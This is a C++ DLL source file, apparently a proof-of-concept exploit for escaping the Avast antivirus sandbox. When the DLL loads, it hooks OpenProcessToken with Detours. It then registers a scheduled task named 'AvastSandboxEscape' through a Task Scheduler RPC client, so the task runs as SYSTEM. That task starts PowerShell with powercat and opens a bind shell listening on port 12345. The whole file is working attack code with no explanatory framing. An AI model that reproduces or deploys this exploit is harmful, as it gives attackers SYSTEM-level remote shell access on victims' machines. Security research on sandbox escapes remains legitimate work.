// dllmain.cpp : Defines the entry point for the DLL application.
#include <Windows.h>
#include "detours.h"
#include "TaskSchedulerRpcClient.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"

#include <string>
#include <stdexcept>
#include <filesystem>
#include <iostream>

namespace fs = std::filesystem;

namespace
{
    static BOOL (WINAPI *OpenProcessToken_Original)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) = nullptr;

    BOOL WINAPI OpenProcessToken_Hook(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)
    {
        if (ProcessHandle == ::GetCurrentProcess() &&
            (DesiredAccess & ~(TOKEN_QUERY | TOKEN_QUERY_SOURCE)) == 0)
        {
            *TokenHandle = ::GetCurrentProcessToken();
            return TRUE;
        }

        return OpenProcessToken_Original(ProcessHandle, DesiredAccess, TokenHandle);
    }

    void ScheduleTaskStartExecutableAsSystem(
        const std::wstring &taskName, const std::wstring &executablePath, const std::wstring &arguments)
    {
        TaskSchedulerRpcClient taskScheduler;
        taskScheduler.RegisterTaskAsSystem(taskName.c_str(), executablePath.c_str(), arguments.c_str());
    }

    DWORD WINAPI SandboxEscapeThread(LPVOID lpParam)
    {
        UNREFERENCED_PARAMETER(lpParam);

        try
        {
            auto thisModuleBaseAddress =
                DetourGetContainingModule(DetourCodeFromPointer(SandboxEscapeThread, nullptr));
            if (!thisModuleBaseAddress)
                throw std::runtime_error("DetourGetContainingModule failed");

            const auto thisModulePath =
                fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));
            auto thisModuleParentDirectoryPath = thisModulePath.parent_path();

            const std::wstring appName = LR"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
            std::wstring cmdLine =
                LR"(. )" + (thisModuleParentDirectoryPath / L"powercat.ps1").wstring() + L";powercat -l -p 12345 -ep";

            ScheduleTaskStartExecutableAsSystem(L"AvastSandboxEscape", appName, cmdLine);
        }
        catch (const std::exception &e)
        {
            // ToDo: Log error
            UNREFERENCED_PARAMETER(e);
            __debugbreak();
        }

        return 0;
    }
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    UNREFERENCED_PARAMETER(lpReserved);

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        try
        {
            static_cast<void>(::DisableThreadLibraryCalls(hModule));

            auto returnValue = DetourTransactionBegin();
            if (returnValue != NO_ERROR)
                throw std::runtime_error("DetourTransactionBegin failed. Error " + std::to_string(returnValue));

            returnValue = DetourUpdateThread(::GetCurrentThread());
            if (returnValue != NO_ERROR)
                throw std::runtime_error("DetourUpdateThread failed. Error " + std::to_string(returnValue));

            OpenProcessToken_Original = reinterpret_cast<decltype(OpenProcessToken_Original)>(
                ::GetProcAddress(::GetModuleHandleW(L"kernelbase.dll"), "OpenProcessToken"));
            if (!OpenProcessToken_Original)
                throw std::runtime_error("GetProcAddress failed. Error " + std::to_string(returnValue));

            returnValue = DetourAttach(&reinterpret_cast<PVOID &>(OpenProcessToken_Original), OpenProcessToken_Hook);
            if (returnValue != NO_ERROR)
                throw std::runtime_error("DetourAttach failed. Error " + std::to_string(returnValue));

            returnValue = DetourTransactionCommit();
            if (returnValue != NO_ERROR)
                throw std::runtime_error("DetourTransactionCommit failed. Error " + std::to_string(returnValue));

            ::CreateThread(NULL, 0, SandboxEscapeThread, NULL, 0, NULL);
        }
        catch (const std::exception &e)
        {
            // ToDo: Log error
            UNREFERENCED_PARAMETER(e);
            __debugbreak();
        }

        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

